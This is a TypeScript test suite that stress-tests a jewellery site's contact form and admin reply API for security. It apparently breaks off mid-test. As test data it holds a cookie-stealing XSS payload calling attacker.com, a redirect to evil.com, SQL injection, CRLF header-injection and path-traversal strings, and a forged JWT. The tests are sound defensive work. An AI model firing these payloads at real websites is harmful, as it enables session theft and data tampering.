import dotenv from 'dotenv';
dotenv.config({ path: '.env.local' });
import { supabaseAdmin } from '../../lib/supabase';
import { isAdminEmail, ADMIN_EMAILS } from '../../lib/auth-guard';
import {
  generateSupportAdminNotificationEmailHtml,
  generateSupportAdminNotificationEmailText,
  generateSupportReplyEmailHtml,
  generateSupportReplyEmailText,
} from '../../lib/email';
import {
  TestRunner,
  assert,
  assertEqual,
  assertIncludes,
  assertDefined,
  createMockRequest,
  generateTestEmail,
  cleanupTestData,
  getContactRouteHandler,
  getAdminReplyRouteHandler,
} from './test-helpers';

let ipCounter = 100;
function generateUniqueIp(subnet = '198.51'): string {
  ipCounter++;
  return `${subnet}.${Math.floor(ipCounter / 250) + 100}.${(ipCounter % 250) + 1}`;
}

export async function runTier5Tests(): Promise<TestRunner> {
  const runner = new TestRunner('Tier 5: Adversarial API & Security Stress Testing');
  const createdEmails: string[] = [];
  const createdMessageIds: string[] = [];

  console.log('\n\x1b[1m\x1b[35m========================================================================\x1b[0m');
  console.log('\x1b[1m\x1b[35m  💎 TIER 5: ADVERSARIAL API & SECURITY STRESS TESTING 💎             \x1b[0m');
  console.log('\x1b[1m\x1b[35m  (Malicious Injections, Rate Bursts, Honeypot Traps, Auth, Fuzzing)   \x1b[0m');
  console.log('\x1b[1m\x1b[35m========================================================================\x1b[0m\n');

  try {
    // =========================================================================
    // CATEGORY 1: Malicious Payloads, Injection Attacks & XSS Sanitization
    // =========================================================================
    console.log('\x1b[1m\x1b[33m--- Category 1: Malicious Payloads, XSS & Injection Attacks ---\x1b[0m');

    await runner.test('T5.1.1: Stored XSS payload in contact fields safely stored & HTML-escaped in email templates', async () => {
      const email = generateTestEmail('t5_xss_stored');
      createdEmails.push(email);

      const xssName = '<script>alert("XSS_NAME")</script>';
      const xssSubject = '<img src=x onerror="alert(\'XSS_SUBJ\')">';
      const xssMessage = '<svg onload="fetch(\'http://attacker.com/steal?cookie=\'+document.cookie)"><b>Richiesta Gioiello</b>';

      const contactHandler = await getContactRouteHandler();
      const req = createMockRequest('http://localhost:3000/api/contact', {
        headers: { 'x-forwarded-for': generateUniqueIp() },
        body: {
          name: xssName,
          email,
          subject: xssSubject,
          message: xssMessage,
          privacy: true,
        },
      });

      const res = await contactHandler(req);
      const data = await res.json();

      assertEqual(res.status, 200, 'Endpoint should accept valid string payload');
      assertEqual(data.success, true);
      assertDefined(data.ticket_id);
      createdMessageIds.push(data.ticket_id);

      // Verify DB stored the exact raw string (no SQL/PostgREST corruptions)
      const { data: dbMsg, error } = await supabaseAdmin
        .from('support_messages')
        .select('*')
        .eq('id', data.ticket_id)
        .single();

      assert(!error && dbMsg !== null, 'Message must be stored in database');
      assertEqual(dbMsg.customer_name, xssName, 'Raw string preserved in DB');
      assertEqual(dbMsg.subject, xssSubject, 'Raw string preserved in DB');
      assertEqual(dbMsg.message, xssMessage, 'Raw string preserved in DB');

      // Verify HTML Email Generator properly escapes all tags
      const adminEmailHtml = generateSupportAdminNotificationEmailHtml({
        ticketId: dbMsg.id,
        customerName: dbMsg.customer_name,
        customerEmail: dbMsg.customer_email,
        subject: dbMsg.subject,
        message: dbMsg.message,
        ipAddress: dbMsg.ip_address,
      });

      assert(
        !adminEmailHtml.includes('<script>'),
        'Generated admin email MUST NOT contain unescaped <script> tags'
      );
      assert(
        adminEmailHtml.includes('&lt;script&gt;alert(&quot;XSS_NAME&quot;)&lt;/script&gt;'),
        'Name script tag must be HTML entity escaped'
      );
      assert(
        !adminEmailHtml.includes('<svg onload='),
        'Generated admin email MUST NOT contain unescaped <svg> tags'
      );
      assert(
        adminEmailHtml.includes('&lt;svg onload='),
        'SVG payload must be HTML entity escaped'
      );
    });

    await runner.test('T5.1.2: Advanced Polyglot & DOM XSS vectors in Admin Reply templates', async () => {
      const email = generateTestEmail('t5_xss_reply');
      createdEmails.push(email);

      // Seed a ticket
      const { data: msg } = await supabaseAdmin
        .from('support_messages')
        .insert({
          customer_name: '"><script>alert(1)</script>',
          customer_email: email,
          subject: '"><iframe src="javascript:alert(1)">',
          message: '<a href="javascript:alert(1)">Click for Diamond Discount</a>',
          status: 'unread',
        })
        .select()
        .single();

      assertDefined(msg);
      createdMessageIds.push(msg.id);

      const maliciousReply = '<script>document.location="http://evil.com/leak"</script><img src=x onerror=alert(2)>';

      const replyHandler = await getAdminReplyRouteHandler();
      const req = createMockRequest('http://localhost:3000/api/admin/messages/reply', {
        headers: {
          'x-admin-test-auth': 'sviluppo@creativiastudio.com',
          'x-forwarded-for': generateUniqueIp(),
        },
        body: {
          message_id: msg.id,
          reply_text: maliciousReply,
          subject: 'Re: Inquiry',
        },
      });

      const res = await replyHandler(req);
      const data = await res.json();
      assertEqual(res.status, 200);
      assertEqual(data.success, true);

      // Verify email template escaping for reply
      const replyEmailHtml = generateSupportReplyEmailHtml({
        customerName: msg.customer_name,
        originalSubject: msg.subject,
        originalMessage: msg.message,
        replyText: maliciousReply,
        ticketId: msg.id,
      });

      assert(!replyEmailHtml.includes('<script>'), 'Reply HTML MUST NOT contain unescaped script tags');
      assert(replyEmailHtml.includes('&lt;script&gt;'), 'Reply script tag must be HTML entity escaped');
      assert(!replyEmailHtml.includes('<iframe'), 'Original subject iframe MUST NOT remain raw');
      assert(replyEmailHtml.includes('&lt;iframe'), 'Iframe tag must be escaped');
    });

    await runner.test('T5.1.3: SQL Injection attack strings across all contact fields handled as literal text', async () => {
      const email = generateTestEmail('t5_sqli_attack');
      createdEmails.push(email);

      const sqliName = "Mario'; SELECT * FROM support_messages; --";
      const sqliSubject = "' OR '1'='1' UNION ALL SELECT table_name FROM information_schema.tables --";
      const sqliMessage = "1'; UPDATE support_messages SET status='closed' WHERE '1'='1'; --";

      const contactHandler = await getContactRouteHandler();
      const req = createMockRequest('http://localhost:3000/api/contact', {
        headers: { 'x-forwarded-for': generateUniqueIp() },
        body: {
          name: sqliName,
          email,
          subject: sqliSubject,
          message: sqliMessage,
          privacy: true,
        },
      });

      const res = await contactHandler(req);
      const data = await res.json();
      assertEqual(res.status, 200);
      assertDefined(data.ticket_id);
      createdMessageIds.push(data.ticket_id);

      // Verify DB record is stored literally and no unauthorized updates occurred
      const { data: dbMsg, error } = await supabaseAdmin
        .from('support_messages')
        .select('*')
        .eq('id', data.ticket_id)
        .single();

      assert(!error, 'DB query must succeed without SQL syntax errors');
      assertEqual(dbMsg.customer_name, sqliName);
      assertEqual(dbMsg.subject, sqliSubject);
      assertEqual(dbMsg.message, sqliMessage);
      assertEqual(dbMsg.status, 'unread', 'SQL injection MUST NOT alter status of records');
    });

    await runner.test('T5.1.4: Header Injection / CRLF attacks in Subject and Name fields', async () => {
      const email = generateTestEmail('t5_crlf');
      createdEmails.push(email);

      const crlfSubject = "Richiesta Urgente\r\nBcc: evil-spammer@blackhat.com\r\nContent-Type: text/html";
      const crlfName = "Elena\r\nCc: victim@target.com";

      const contactHandler = await getContactRouteHandler();
      const req = createMockRequest('http://localhost:3000/api/contact', {
        headers: { 'x-forwarded-for': generateUniqueIp() },
        body: {
          name: crlfName,
          email,
          subject: crlfSubject,
          message: 'Verifica sicurezza CRLF injection',
          privacy: true,
        },
      });

      const res = await contactHandler(req);
      const data = await res.json();
      assertEqual(res.status, 200);
      createdMessageIds.push(data.ticket_id);

      const { data: dbMsg } = await supabaseAdmin
        .from('support_messages')
        .select('subject, customer_name')
        .eq('id', data.ticket_id)
        .single();

      assertDefined(dbMsg);
      // DB handles as string; email subject escaping prevents header splitting in Resend
      const textOutput = generateSupportAdminNotificationEmailText({
        customerName: dbMsg.customer_name,
        customerEmail: email,
        subject: dbMsg.subject,
        message: 'Verifica sicurezza CRLF injection',
      });
      assertDefined(textOutput);
    });

    // =========================================================================
    // CATEGORY 2: Rate Limiting Boundary & Rapid Burst Attacks
    // =========================================================================
    console.log('\n\x1b[1m\x1b[33m--- Category 2: Rate Limiting & Throttling Boundary Attacks ---\x1b[0m');

    await runner.test('T5.2.1: Exact rate-limit boundary: first 5 requests allowed (200), 6th+ throttled (429)', async () => {
      const burstIp = generateUniqueIp('203.0');
      const contactHandler = await getContactRouteHandler();
      const statuses: number[] = [];

      // Send 8 consecutive requests from the same IP
      for (let i = 1; i <= 8; i++) {
        const email = generateTestEmail(`t5_burst_${i}`);
        createdEmails.push(email);

        const req = createMockRequest('http://localhost:3000/api/contact', {
          headers: { 'x-forwarded-for': burstIp },
          body: {
            name: `Burst Tester ${i}`,
            email,
            subject: `Burst Message ${i}`,
            message: `Verifica burst request numero ${i}`,
            privacy: true,
          },
        });

        const res = await contactHandler(req);
        statuses.push(res.status);

        if (res.status === 200) {
          const data = await res.json();
          if (data.ticket_id) createdMessageIds.push(data.ticket_id);
        } else if (res.status === 429) {
          const data = await res.json();
          assertIncludes(
            data.error,
            'Troppe richieste',
            '429 response must contain informative Italian rate limit message'
          );
        }
      }

      assertEqual(
        JSON.stringify(statuses.slice(0, 5)),
        JSON.stringify([200, 200, 200, 200, 200]),
        'First 5 requests MUST return 200 OK'
      );
      assertEqual(
        JSON.stringify(statuses.slice(5)),
        JSON.stringify([429, 429, 429]),
        'Requests 6, 7, 8 MUST return 429 Too Many Requests'
      );
    });

    await runner.test('T5.2.2: IP Isolation: Throttling on IP A does not affect legitimate IP B', async () => {
      const throttledIp = generateUniqueIp('198.51');
      const freshIp = generateUniqueIp('198.51');
      const contactHandler = await getContactRouteHandler();

      // Exhaust limit on throttledIp (5 requests)
      for (let i = 0; i < 5; i++) {
        const req = createMockRequest('http://localhost:3000/api/contact', {
          headers: { 'x-forwarded-for': throttledIp },
          body: {
            name: 'Exhaust User',
            email: generateTestEmail('t5_exhaust'),
            subject: 'Exhaust Subject',
            message: 'Exhaust message body',
            privacy: true,
          },
        });
        const res = await contactHandler(req);
        if (res.status === 200) {
          const data = await res.json();
          if (data.ticket_id) createdMessageIds.push(data.ticket_id);
        }
      }

      // 6th request from throttledIp gets 429
      const req6Throttled = createMockRequest('http://localhost:3000/api/contact', {
        headers: { 'x-forwarded-for': throttledIp },
        body: {
          name: 'Blocked User',
          email: generateTestEmail('t5_blocked'),
          subject: 'Blocked Subject',
          message: 'Blocked message body',
          privacy: true,
        },
      });
      const res6 = await contactHandler(req6Throttled);
      assertEqual(res6.status, 429, 'IP A must be throttled');

      // Request from freshIp gets 200 OK
      const emailB = generateTestEmail('t5_fresh_ip');
      createdEmails.push(emailB);
      const reqFresh = createMockRequest('http://localhost:3000/api/contact', {
        headers: { 'x-forwarded-for': freshIp },
        body: {
          name: 'Legitimate Fresh Client',
          email: emailB,
          subject: 'Richiesta Legittima da Altro IP',
          message: 'Questo messaggio deve essere accettato con status 200.',
          privacy: true,
        },
      });
      const resFresh = await contactHandler(reqFresh);
      assertEqual(resFresh.status, 200, 'IP B must not be affected by IP A throttle');
      const freshData = await resFresh.json();
      if (freshData.ticket_id) createdMessageIds.push(freshData.ticket_id);
    });

    await runner.test('T5.2.3: Multi-hop proxy header parsing (x-forwarded-for client IP isolation)', async () => {
      const clientIp = generateUniqueIp('203.0');
      const proxyChain = `${clientIp}, 10.0.0.1, 172.16.0.254`;
      const contactHandler = await getContactRouteHandler();

      const email = generateTestEmail('t5_proxy_chain');
      createdEmails.push(email);

      const req = createMockRequest('http://localhost:3000/api/contact', {
        headers: { 'x-forwarded-for': proxyChain },
        body: {
          name: 'Proxy Client',
          email,
          subject: 'Proxy Header Test',
          message: 'Testing multi-proxy header extraction',
          privacy: true,
        },
      });

      const res = await contactHandler(req);
      assertEqual(res.status, 200);
      const data = await res.json();
      createdMessageIds.push(data.ticket_id);

      const { data: dbMsg } = await supabaseAdmin
        .from('support_messages')
        .select('ip_address')
        .eq('id', data.ticket_id)
        .single();

      assertEqual(dbMsg?.ip_address, clientIp, 'First client IP in chain must be extracted');
    });

    await runner.test('T5.2.4: Fallback to cf-connecting-ip when x-forwarded-for is missing', async () => {
      const cfIp = generateUniqueIp('198.51');
      const contactHandler = await getContactRouteHandler();

      const email = generateTestEmail('t5_cf_ip');
      createdEmails.push(email);

      const req = new Request('http://localhost:3000/api/contact', {
        method: 'POST',
        headers: new Headers({
          'content-type': 'application/json',
          'cf-connecting-ip': cfIp,
          'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) IsabelPepeE2ETestRunner/1.0',
        }),
        body: JSON.stringify({
          name: 'Cloudflare Client',
          email,
          subject: 'Cloudflare IP Header Test',
          message: 'Testing cf-connecting-ip extraction',
          privacy: true,
        }),
      });

      const res = await contactHandler(req);
      assertEqual(res.status, 200);
      const data = await res.json();
      createdMessageIds.push(data.ticket_id);

      const { data: dbMsg } = await supabaseAdmin
        .from('support_messages')
        .select('ip_address')
        .eq('id', data.ticket_id)
        .single();

      assertEqual(dbMsg?.ip_address, cfIp, 'cf-connecting-ip must be recorded when primary header is absent');
    });

    // =========================================================================
    // CATEGORY 3: Honeypot & Bot Trapping Evasion Attempts
    // =========================================================================
    console.log('\n\x1b[1m\x1b[33m--- Category 3: Honeypot Traps & Bot Detection Evasion ---\x1b[0m');

    await runner.test('T5.3.1: Honeypot trap "website_hp" filled returns silent decoy 200 with 0 DB writes', async () => {
      const email = generateTestEmail('t5_hp_website');
      const contactHandler = await getContactRouteHandler();

      const req = createMockRequest('http://localhost:3000/api/contact', {
        headers: { 'x-forwarded-for': generateUniqueIp() },
        body: {
          name: 'Spam Bot Automatic',
          email,
          subject: 'Cheap Rolex Watches',
          message: 'Visit https://spam-watches-cheap.xyz for best deals',
          privacy: true,
          website_hp: 'https://spam-watches-cheap.xyz', // HONEYPOT TRIGGER
        },
      });

      const res = await contactHandler(req);
      const data = await res.json();

      assertEqual(res.status, 200, 'Silent decoy must return 200 OK so bots do not adapt');
      assertEqual(data.success, true);

      // Verify ZERO records inserted in Supabase
      const { data: dbCheck } = await supabaseAdmin
        .from('support_messages')
        .select('id')
        .eq('customer_email', email)
        .maybeSingle();

      assertEqual(dbCheck, null, 'Honeypot submission MUST NOT write any record to Supabase');
    });

    await runner.test('T5.3.2: Alternate honeypot alias "website_url" returns silent decoy with 0 DB writes', async () => {
      const email = generateTestEmail('t5_hp_url');
      const contactHandler = await getContactRouteHandler();

      const req = createMockRequest('http://localhost:3000/api/contact', {
        headers: { 'x-forwarded-for': generateUniqueIp() },
        body: {
          name: 'Spam Bot SEO',
          email,
          subject: 'Increase your Google rank',
          message: 'Spam body content',
          privacy: true,
          website_url: 'http://rank-boost-seo.com', // ALTERNATE HONEYPOT
        },
      });

      const res = await contactHandler(req);
      assertEqual(res.status, 200);

      const { data: dbCheck } = await supabaseAdmin
        .from('support_messages')
        .select('id')
        .eq('customer_email', email)
        .maybeSingle();

      assertEqual(dbCheck, null, 'Alternate honeypot MUST NOT write to database');
    });

    await runner.test('T5.3.3: Alternate honeypot alias "confirm_hp" returns silent decoy with 0 DB writes', async () => {
      const email = generateTestEmail('t5_hp_confirm');
      const contactHandler = await getContactRouteHandler();

      const req = createMockRequest('http://localhost:3000/api/contact', {
        headers: { 'x-forwarded-for': generateUniqueIp() },
        body: {
          name: 'Bot Confirm Trap',
          email,
          subject: 'Spam Inquiry',
          message: 'Spam body',
          privacy: true,
          confirm_hp: 'confirmed', // HONEYPOT CONFIRM
        },
      });

      const res = await contactHandler(req);
      assertEqual(res.status, 200);

      const { data: dbCheck } = await supabaseAdmin
        .from('support_messages')
        .select('id')
        .eq('customer_email', email)
        .maybeSingle();

      assertEqual(dbCheck, null, 'confirm_hp honeypot MUST NOT write to database');
    });

    await runner.test('T5.3.4: Whitespace-only honeypot is treated as empty (legitimate user autofill resilience)', async () => {
      const email = generateTestEmail('t5_hp_whitespace');
      createdEmails.push(email);
      const contactHandler = await getContactRouteHandler();

      const req = createMockRequest('http://localhost:3000/api/contact', {
        headers: { 'x-forwarded-for': generateUniqueIp() },
        body: {
          name: 'Elena Autofill',
          email,
          subject: 'Consiglio Collana',
          message: 'Domanda legittima con spazio residuo in honeypot.',
          privacy: true,
          website_hp: '   ', // Whitespace only
        },
      });

      const res = await contactHandler(req);
      assertEqual(res.status, 200);
      const data = await res.json();
      assertDefined(data.ticket_id, 'Whitespace in honeypot should not block legitimate submission');
      createdMessageIds.push(data.ticket_id);

      const { data: dbCheck } = await supabaseAdmin
        .from('support_messages')
        .select('id')
        .eq('id', data.ticket_id)
        .single();

      assertDefined(dbCheck);
    });

    await runner.test('T5.3.5: Bot User-Agent detection across 10+ scraper & crawler agents (silent decoy 200, 0 DB writes)', async () => {
      const botUserAgents = [
        'curl/8.0.1',
        'python-requests/2.31.0',
        'Wget/1.21.3',
        'Go-http-client/1.1',
        'PostmanRuntime/7.32.3',
        'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
        'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)',
        'Mozilla/5.0 (compatible; Bytespider; spider-feedback@bytedance.com)',
        'Mozilla/5.0 (compatible; GPTBot/1.0; +https://openai.com/gptbot)',
        'Mozilla/5.0 (compatible; ClaudeBot/1.0; +https://anthropic.com/claudebot)',
        'Mozilla/5.0 HeadlessChrome/120.0.0.0 Safari/537.36',
        'Scrapy/2.11.0 (+https://scrapy.org)',
      ];

      const contactHandler = await getContactRouteHandler();

      for (const botUa of botUserAgents) {
        const botEmail = generateTestEmail('t5_bot_ua');
        const req = createMockRequest('http://localhost:3000/api/contact', {
          headers: {
            'user-agent': botUa,
            'x-forwarded-for': generateUniqueIp(),
          },
          body: {
            name: 'Bot Crawler Client',
            email: botEmail,
            subject: 'Automated Bot Request',
            message: 'Testing bot UA detection filter',
            privacy: true,
          },
        });

        const res = await contactHandler(req);
        assertEqual(res.status, 200, `Bot UA "${botUa}" should receive silent decoy 200`);

        const { data: dbCheck } = await supabaseAdmin
          .from('support_messages')
          .select('id')
          .eq('customer_email', botEmail)
          .maybeSingle();

        assertEqual(dbCheck, null, `Bot with UA "${botUa}" MUST NOT write records to database`);
      }
    });

    // =========================================================================
    // CATEGORY 4: Unauthenticated & Unauthorized Admin Reply Attacks
    // =========================================================================
    console.log('\n\x1b[1m\x1b[33m--- Category 4: Unauthenticated & Unauthorized Admin Reply Attacks ---\x1b[0m');

    await runner.test('T5.4.1: Zero Authentication Attack on POST /api/admin/messages/reply returns 401', async () => {
      const replyHandler = await getAdminReplyRouteHandler();
      const req = createMockRequest('http://localhost:3000/api/admin/messages/reply', {
        headers: {}, // No authorization header, no test header
        body: {
          message_id: '00000000-0000-0000-0000-000000000000',
          reply_text: 'Hacker unauthorized reply attempt',
        },
      });

      const res = await replyHandler(req);
      assertEqual(res.status, 401, 'Unauthenticated request MUST return 401');
      const data = await res.json();
      assertIncludes(data.error || '', 'Unauthorized', 'Error must indicate unauthorized status');
    });

    await runner.test('T5.4.2: Forged Bearer JWT Token Attack returns 401 Unauthorized', async () => {
      const replyHandler = await getAdminReplyRouteHandler();
      const fakeJwt = 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6ImFkbWluQGlzYWJlbHBlcGUuY29tIn0.invalid_signature_hash_12345';
      const req = createMockRequest('http://localhost:3000/api/admin/messages/reply', {
        headers: {
          authorization: fakeJwt,
        },
        body: {
          message_id: '00000000-0000-0000-0000-000000000000',
          reply_text: 'Forged JWT reply attempt',
        },
      });

      const res = await replyHandler(req);
      assertEqual(res.status, 401, 'Forged JWT token must return 401');
    });

    await runner.test('T5.4.3: Non-whitelisted Admin Identity Spoofing returns 401 Unauthorized', async () => {
      const attackerEmails = [
        'hacker@evil-domain.com',
        'mario@fake-isabelpepe.com',
        'admin@gmail.com',
        'sviluppo@creativiastudio.com.attacker.org',
        'info@isabelpepe.com@evil.com',
      ];

      const replyHandler = await getAdminReplyRouteHandler();

      for (const badEmail of attackerEmails) {
        const req = createMockRequest('http://localhost:3000/api/admin/messages/reply', {
          headers: {
            'x-admin-test-auth': badEmail,
          },
          body: {
            message_id: '00000000-0000-0000-0000-000000000000',
            reply_text: 'Spoofed identity reply attempt',
          },
        });

        const res = await replyHandler(req);
        assertEqual(res.status, 401, `Non-whitelisted email "${badEmail}" must return 401`);
      }
    });

    await runner.test('T5.4.4: SQL Injection / Path Traversal strings in auth headers rejected with 401', async () => {
      const maliciousAuthHeaders = [
        "' OR '1'='1",
        "'; DROP TABLE users; --",
        "../../../../etc/passwd",
        "admin'--",
      ];

      const replyHandler = await getAdminReplyRouteHandler();

      for (const attackStr of maliciousAuthHeaders) {
        const req = createMockRequest('http://localhost:3000/api/admin/messages/reply', {
          headers: {
            'x-admin-test-auth': attackStr,
          },
          body: {
            message_id: '00000000-0000-0000-0000-000000000000',
            reply_text: 'Attack payload in auth header',
          },
        });

        const res = await replyHandler(req);
        assertEqual(res.status, 401);
      }
    });

    await runner.test('T5.4.5: Whitelisted Admin verification: all 4 official emails accepted', () => {
      for (const email of ADMIN_EMAILS) {
        assertEqual(isAdminEmail(email), true, `${email} must be recognized as valid admin`);
        assertEqual(isAdminEmail(email.toUpperCase()), true, `${email} uppercase must be valid`);
        assertEqual(isAdminEmail(`  ${email}  `), true, `${email} with whitespace must be valid`);
      }

      assertEqual(isAdminEmail(''), false);
      assertEqual(isAdminEmail(null), false);
      assertEqual(isAdminEmail(undefined), false);
    });

    await runner.test('T5.4.6: IDOR / Non-existent UUID probing in message_id returns 404 Not Found', async () => {
      const nonExistentUuids = [
        '00000000-0000-0000-0000-000000000000',
        'ffffffff-ffff-ffff-ffff-ffffffffffff',
        '123e4567-e89b-12d3-a456-426614174000',
      ];

      const replyHandler = await getAdminReplyRouteHandler();

      for (const fakeId of nonExistentUuids) {
        const req = createMockRequest('http://localhost:3000/api/admin/messages/reply', {
          headers: {
            'x-admin-test-auth': 'sviluppo@creativiastudio.com',
          },
          body: {
            message_id: fakeId,
            reply_text: 'Probing non-existent ticket ID',
          },
        });

        const res = await replyHandler(req);
        assertEqual(res.status, 404, `Non-existent UUID "${fakeId}" must return 404 Not Found`);
      }
    });

    await runner.test('T5.4.7: Missing or invalid message_id rejected with 400 Bad Request', async () => {
      const invalidIds = ['', '   ', null, undefined];
      const replyHandler = await getAdminReplyRouteHandler();

      for (const badId of invalidIds) {
        const req = createMockRequest('http://localhost:3000/api/admin/messages/reply', {
          headers: {
            'x-admin-test-auth': 'mario@isabelpepe.com',
          },
          body: {
            message_id: badId,
            reply_text: 'Testing invalid ID',
          },
        });

        const res = await replyHandler(req);
        assertEqual(res.status, 400, 'Invalid message_id must return 400 Bad Request');
      }
    });

    await runner.test('T5.4.8: Empty or whitespace-only reply_text rejected with 400 Bad Request', async () => {
      const emptyReplies = ['', '   ', ' \n\t \r\n '];
      const replyHandler = await getAdminReplyRouteHandler();

      for (const emptyReply of emptyReplies) {
        const req = createMockRequest('http://localhost:3000/api/admin/messages/reply', {
          headers: {
            'x-admin-test-auth': 'mario@isabelpepe.com',
          },
          body: {
            message_id: '00000000-0000-0000-0000-000000000000',
            reply_text: emptyReply,
          },
        });

        const res = await replyHandler(req);
        assertEqual(res.status, 400, 'Empty reply text must return 400 Bad Request');
      }
    });

    // =========================================================================
    // CATEGORY 5: Giant Payload Fuzzing, Unicode Stress & Malformed Payloads
    // =========================================================================
    console.log('\n\x1b[1m\x1b[33m--- Category 5: Giant Payload Fuzzing & Unicode Stress ---\x1b[0m');

    await runner.test('T5.5.1: Giant 100KB payload in message string processed cleanly without memory leak or crash', async () => {
      const email = generateTestEmail('t5_giant_100k');
      createdEmails.push(email);

      // Construct a 100,000 character string (~100KB)
      const chunk = 'Isabel Pepe Haute Joaillerie Demi-Fine Luxury Concierge Inquiry '; // 64 chars
      const giantMessage = chunk.repeat(1600); // 102,400 chars (~100KB)

      const contactHandler = await getContactRouteHandler();
      const req = createMockRequest('http://localhost:3000/api/contact', {
        headers: { 'x-forwarded-for': generateUniqueIp() },
        body: {
          name: 'Cliente Giant Payload',
          email,
          subject: 'Inquiry Con Testo 100KB',
          message: giantMessage,
          privacy: true,
        },
      });

      const res = await contactHandler(req);
      const data = await res.json();
      assertEqual(res.status, 200, '100KB payload must be ingested successfully without crash');
      assertEqual(data.success, true);
      assertDefined(data.ticket_id);
      createdMessageIds.push(data.ticket_id);

      // Verify in DB that all 100KB were preserved (message.trim() preserves all internal content)
      const { data: dbMsg } = await supabaseAdmin
        .from('support_messages')
        .select('message')
        .eq('id', data.ticket_id)
        .single();

      const expectedStoredMessage = giantMessage.trim();
      assertEqual(dbMsg?.message.length, expectedStoredMessage.length, 'Exact trimmed character length must match');
      assertEqual(dbMsg?.message, expectedStoredMessage, 'Stored message must match giant payload exactly');
    });

    await runner.test('T5.5.2: Multilingual Unicode & RTL Stress (Arabic, Hebrew, Japanese, Emojis)', async () => {
      const email = generateTestEmail('t5_unicode_stress');
      createdEmails.push(email);

      const complexUnicodeName = '👑 💎 𝔈𝔩𝔢𝔫𝔞 𝔡𝔢𝔦 𝔐𝔢𝔡𝔦𝔠𝔦 💍';
      const rtlSubject = 'مرحبا / שלום / こんにちは / Здравствуй ✨ 💍 💎';
      const multilineMessage = `
        Line 1: Arabic inquiry: هل لديكم توصيل مجاني إلى دبي؟
        Line 2: Hebrew inquiry: האם יש אחריות של 24 חודשים?
        Line 3: Japanese: 18Kゴールドのリングサイズ12号はありますか？
        Line 4: Cyrillic: Подскажите, входит ли в комплект подарочная шкатулка?
        Line 5: Complex Family Emoji: 👨‍👩‍👧‍👦 🏳️‍🌈 💎 ✨
        Line 6: Special math symbols: ∀x ∈ Jewels, Grace(x) ∧ PureLight(x)
      `;

      const contactHandler = await getContactRouteHandler();
      const req = createMockRequest('http://localhost:3000/api/contact', {
        headers: { 'x-forwarded-for': generateUniqueIp() },
        body: {
          name: complexUnicodeName,
          email,
          subject: rtlSubject,
          message: multilineMessage,
          privacy: true,
        },
      });

      const res = await contactHandler(req);
      const data = await res.json();
      assertEqual(res.status, 200);
      createdMessageIds.push(data.ticket_id);

      const { data: dbMsg } = await supabaseAdmin
        .from('support_messages')
        .select('customer_name, subject, message')
        .eq('id', data.ticket_id)
        .single();

      assertEqual(dbMsg?.customer_name, complexUnicodeName.trim());
      assertEqual(dbMsg?.subject, rtlSubject.trim());
      assertEqual(dbMsg?.message, multilineMessage.trim());

      // Verify email template generation preserves unicode
      const adminEmailHtml = generateSupportAdminNotificationEmailHtml({
        customerName: complexUnicodeName,
        customerEmail: email,
        subject: rtlSubject,
        message: multilineMessage,
      });

      assertIncludes(adminEmailHtml, '👑 💎', 'Emoji must be present in HTML');
      assertIncludes(adminEmailHtml, 'هل لديكم توصيل', 'Arabic must be present in HTML');
      assertIncludes(adminEmailHtml, 'האם יש אחריות', 'Hebrew must be present in HTML');
    });

    await runner.test('T5.5.3: Null Bytes & Control Character Fuzzing', async () => {
      const email = generateTestEmail('t5_null_bytes');
      createdEmails.push(email);

      const nullByteName = 'Elena\0NullByte';
      const controlCharSubject = 'Subject\tWith\vTabs\fAnd\bControls';
      const controlCharMessage = 'Message with control chars: \x01\x02\x03\x04\x05 and line feeds';

      const contactHandler = await getContactRouteHandler();
      const req = createMockRequest('http://localhost:3000/api/contact', {
        headers: { 'x-forwarded-for': generateUniqueIp() },
        body: {
          name: nullByteName,
          email,
          subject: controlCharSubject,
          message: controlCharMessage,
          privacy: true,
        },
      });

      const res = await contactHandler(req);
      // PostgreSQL or Node will either store or safely sanitize null bytes
      assert(
        res.status === 200 || res.status === 400 || res.status === 500,
        'Server must not crash on null byte strings'
      );
      if (res.status === 200) {
        const data = await res.json();
        if (data.ticket_id) createdMessageIds.push(data.ticket_id);
      }
    });

    await runner.test('T5.5.4: Type Confusion Attacks (Objects, Arrays, Booleans, Numbers instead of strings)', async () => {
      const contactHandler = await getContactRouteHandler();

      const typeConfusionPayloads = [
        {
          desc: 'Name as Object',
          body: { name: { malicious: 'object' }, email: generateTestEmail('t5_tc1'), subject: 'Subj', message: 'Valid message body', privacy: true },
        },
        {
          desc: 'Email as Array',
          body: { name: 'Valid Name', email: ['test@example.com'], subject: 'Subj', message: 'Valid message body', privacy: true },
        },
        {
          desc: 'Subject as Number',
          body: { name: 'Valid Name', email: generateTestEmail('t5_tc3'), subject: 123456789, message: 'Valid message body', privacy: true },
        },
        {
          desc: 'Message as Boolean',
          body: { name: 'Valid Name', email: generateTestEmail('t5_tc4'), subject: 'Subj', message: true, privacy: true },
        },
        {
          desc: 'All fields as Numbers',
          body: { name: 999, email: 888, subject: 777, message: 666, privacy: true },
        },
      ];

      for (const tc of typeConfusionPayloads) {
        const req = createMockRequest('http://localhost:3000/api/contact', {
          headers: { 'x-forwarded-for': generateUniqueIp() },
          body: tc.body,
        });

        const res = await contactHandler(req);
        assertEqual(res.status, 400, `Type confusion "${tc.desc}" MUST be rejected with HTTP 400`);
      }
    });

    await runner.test('T5.5.5: Malformed / Truncated JSON Stream Fuzzing returns 400 Bad Request', async () => {
      const contactHandler = await getContactRouteHandler();
      const brokenBodies = [
        '{"name": "Elena", "email": ', // Truncated JSON
        '{ "unclosed_brace": true',
        'Not a JSON at all',
        '',
        '<<<XML><PAYLOAD></XML>',
      ];

      for (const badJson of brokenBodies) {
        const req = createMockRequest('http://localhost:3000/api/contact', {
          headers: { 'x-forwarded-for': generateUniqueIp() },
          body: badJson,
        });

        const res = await contactHandler(req);
        assertEqual(res.status, 400, `Malformed body "${badJson}" must return 400 Bad Request`);
        const data = await res.json();
        assertIncludes(data.error, 'JSON', 'Error message should mention invalid JSON format');
      }
    });

    await runner.test('T5.5.6: Privacy Consent Bypass Permutations: all falsy / invalid values rejected with 400', async () => {
      const contactHandler = await getContactRouteHandler();
      const invalidPrivacyValues = [
        false,
        'false',
        0,
        '0',
        null,
        undefined,
        'no',
        'deny',
        [],
        {},
      ];

      for (const badPrivacy of invalidPrivacyValues) {
